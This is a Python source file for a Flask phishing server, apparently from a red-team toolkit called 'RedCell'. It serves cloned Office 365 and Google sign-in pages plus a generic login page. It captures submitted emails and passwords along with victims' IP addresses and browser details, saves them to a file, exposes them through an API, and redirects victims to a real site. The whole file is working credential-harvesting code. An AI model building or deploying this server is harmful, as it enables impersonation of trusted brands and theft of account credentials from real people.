"""
Phishing Server Infrastructure

Flask-based phishing page server with credential harvesting.
"""

from flask import Flask, request, render_template_string, redirect, jsonify
import json
import os
from datetime import datetime
from typing import Dict, List, Optional
import logging


class PhishingServer:
    """
    Phishing page server with credential harvesting.

    Features:
    - Multiple phishing templates (Office 365, Gmail, generic login)
    - Credential capture and logging
    - Automatic redirection after capture
    - IP and user-agent logging
    - JSON export of harvested credentials
    """

    # Office 365 login page template
    OFFICE365_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f2f1;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,.2);
            width: 440px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 108px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 8px 12px;
            font-size: 15px;
            border: 1px solid #8a8886;
            outline: none;
        }
        input[type="email"]:focus, input[type="password"]:focus {
            border: 1px solid #0078d4;
        }
        .btn {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 8px 24px;
            font-size: 15px;
            cursor: pointer;
            float: right;
            margin-top: 8px;
        }
        .btn:hover {
            background-color: #005a9e;
        }
        .error {
            color: #a4262c;
            font-size: 12px;
            margin-top: 4px;
            display: {{ 'block' if error else 'none' }};
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 108 24" width="108" height="24">
                <path fill="#f25022" d="M0 0h10.8v10.8H0z"/>
                <path fill="#7fba00" d="M12 0h10.8v10.8H12z"/>
                <path fill="#00a4ef" d="M0 12h10.8v10.8H0z"/>
                <path fill="#ffb900" d="M12 12h10.8v10.8H12z"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST" action="{{ action_url }}">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn">Sign in</button>
        </form>
    </div>
</body>
</html>
'''

    # Gmail login template
    GMAIL_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            width: 450px;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #202124;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 24px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
        }
        input[type="email"]:focus, input[type="password"]:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            float: right;
            margin-top: 16px;
        }
        .btn:hover {
            background-color: #1765cc;
        }
        .error {
            color: #d93025;
            font-size: 14px;
            margin-bottom: 16px;
            display: {{ 'block' if error else 'none' }};
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span style="color: #4285f4; font-size: 32px; font-weight: 500;">Google</span>
        </div>
        <h1>Sign in</h1>
        <div class="subtitle">Use your Google Account</div>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST" action="{{ action_url }}">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email or phone" required autofocus>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn">Next</button>
        </form>
    </div>
</body>
</html>
'''

    # Generic login template
    GENERIC_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,.2);
            width: 400px;
        }
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
        }
        input[type="text"], input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        .btn {
            width: 100%;
            background: #667eea;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:hover {
            background: #5568d3;
        }
        .error {
            color: #e74c3c;
            font-size: 14px;
            margin-bottom: 15px;
            text-align: center;
            display: {{ 'block' if error else 'none' }};
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>{{ title }}</h1>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST" action="{{ action_url }}">
            <div class="form-group">
                <label>Email</label>
                <input type="email" name="email" required autofocus>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit" class="btn">Sign In</button>
        </form>
    </div>
</body>
</html>
'''

    def __init__(
        self,
        port: int = 8080,
        harvest_file: str = 'harvested_creds.json',
        redirect_url: str = 'https://www.google.com',
        verbose: bool = True
    ):
        """
        Initialize phishing server.

        Args:
            port: Server port
            harvest_file: File to store harvested credentials
            redirect_url: URL to redirect after credential capture
            verbose: Enable verbose logging
        """
        self.port = port
        self.harvest_file = harvest_file
        self.redirect_url = redirect_url
        self.verbose = verbose
        self.app = Flask(__name__)
        self.harvested_creds: List[Dict] = []

        # Load existing harvested credentials
        self._load_harvested_creds()

        # Setup routes
        self._setup_routes()

        # Configure logging
        if not verbose:
            log = logging.getLogger('werkzeug')
            log.setLevel(logging.ERROR)

    def _load_harvested_creds(self):
        """Load previously harvested credentials from file."""
        if os.path.exists(self.harvest_file):
            try:
                with open(self.harvest_file, 'r') as f:
                    self.harvested_creds = json.load(f)
            except:
                self.harvested_creds = []

    def _save_harvested_creds(self):
        """Save harvested credentials to file."""
        with open(self.harvest_file, 'w') as f:
            json.dump(self.harvested_creds, f, indent=2)

    def _capture_credentials(self, cred_type: str) -> Dict:
        """
        Capture and log credentials from request.

        Args:
            cred_type: Type of phishing page (office365, gmail, generic)

        Returns:
            Captured credential data
        """
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        username = request.form.get('username', '')

        cred_data = {
            'timestamp': datetime.now().isoformat(),
            'type': cred_type,
            'email': email,
            'username': username,
            'password': password,
            'ip_address': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'referer': request.headers.get('Referer', ''),
        }

        self.harvested_creds.append(cred_data)
        self._save_harvested_creds()

        if self.verbose:
            print(f"\n[+] Credential Captured!")
            print(f"    Type: {cred_type}")
            print(f"    Email: {email}")
            print(f"    Password: {'*' * len(password)}")
            print(f"    IP: {request.remote_addr}")
            print(f"    User-Agent: {request.headers.get('User-Agent', '')[:50]}...")

        return cred_data

    def _setup_routes(self):
        """Setup Flask routes for phishing pages."""

        @self.app.route('/office365', methods=['GET', 'POST'])
        def office365():
            if request.method == 'POST':
                self._capture_credentials('office365')
                return redirect(self.redirect_url)

            return render_template_string(
                self.OFFICE365_TEMPLATE,
                action_url='/office365',
                error=request.args.get('error')
            )

        @self.app.route('/gmail', methods=['GET', 'POST'])
        def gmail():
            if request.method == 'POST':
                self._capture_credentials('gmail')
                return redirect(self.redirect_url)

            return render_template_string(
                self.GMAIL_TEMPLATE,
                action_url='/gmail',
                error=request.args.get('error')
            )

        @self.app.route('/login', methods=['GET', 'POST'])
        @self.app.route('/', methods=['GET', 'POST'])
        def generic():
            if request.method == 'POST':
                self._capture_credentials('generic')
                return redirect(self.redirect_url)

            title = request.args.get('title', 'Sign In')
            return render_template_string(
                self.GENERIC_TEMPLATE,
                action_url='/login',
                title=title,
                error=request.args.get('error')
            )

        @self.app.route('/api/harvested', methods=['GET'])
        def api_harvested():
            """API endpoint to retrieve harvested credentials."""
            return jsonify({
                'total': len(self.harvested_creds),
                'credentials': self.harvested_creds
            })

        @self.app.route('/api/stats', methods=['GET'])
        def api_stats():
            """API endpoint for statistics."""
            stats = {
                'total_captured': len(self.harvested_creds),
                'by_type': {},
                'unique_ips': len(set(c['ip_address'] for c in self.harvested_creds))
            }

            for cred in self.harvested_creds:
                cred_type = cred['type']
                stats['by_type'][cred_type] = stats['by_type'].get(cred_type, 0) + 1

            return jsonify(stats)

    def run(self, host: str = '0.0.0.0'):
        """
        Start the phishing server.

        Args:
            host: Host to bind to
        """
        print(f"[*] Starting phishing server on {host}:{self.port}")
        print(f"[*] Available endpoints:")
        print(f"    http://{host if host != '0.0.0.0' else 'localhost'}:{self.port}/office365")
        print(f"    http://{host if host != '0.0.0.0' else 'localhost'}:{self.port}/gmail")
        print(f"    http://{host if host != '0.0.0.0' else 'localhost'}:{self.port}/login")
        print(f"[*] API endpoints:")
        print(f"    http://{host if host != '0.0.0.0' else 'localhost'}:{self.port}/api/harvested")
        print(f"    http://{host if host != '0.0.0.0' else 'localhost'}:{self.port}/api/stats")
        print(f"[*] Credentials will be saved to: {self.harvest_file}")
        print(f"[*] Victims will be redirected to: {self.redirect_url}\n")

        self.app.run(host=host, port=self.port, debug=False)

    def get_harvested_credentials(self) -> List[Dict]:
        """
        Get all harvested credentials.

        Returns:
            List of credential dictionaries
        """
        return self.harvested_creds

    def export_to_file(self, output_file: str, format: str = 'json'):
        """
        Export harvested credentials to file.

        Args:
            output_file: Output file path
            format: Export format (json, csv)
        """
        if format == 'json':
            with open(output_file, 'w') as f:
                json.dump(self.harvested_creds, f, indent=2)
        elif format == 'csv':
            import csv
            if self.harvested_creds:
                keys = self.harvested_creds[0].keys()
                with open(output_file, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=keys)
                    writer.writeheader()
                    writer.writerows(self.harvested_creds)

        print(f"[+] Exported {len(self.harvested_creds)} credentials to {output_file}")


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Phishing Server')
    parser.add_argument('--port', type=int, default=8080, help='Server port')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--redirect', default='https://www.google.com',
                       help='Redirect URL after credential capture')
    parser.add_argument('--output', default='harvested_creds.json',
                       help='File to store harvested credentials')
    parser.add_argument('--quiet', action='store_true',
                       help='Suppress verbose output')

    args = parser.parse_args()

    server = PhishingServer(
        port=args.port,
        harvest_file=args.output,
        redirect_url=args.redirect,
        verbose=not args.quiet
    )

    try:
        server.run(host=args.host)
    except KeyboardInterrupt:
        print("\n[*] Shutting down phishing server...")
        print(f"[+] Total credentials harvested: {len(server.get_harvested_credentials())}")


if __name__ == '__main__':
    main()
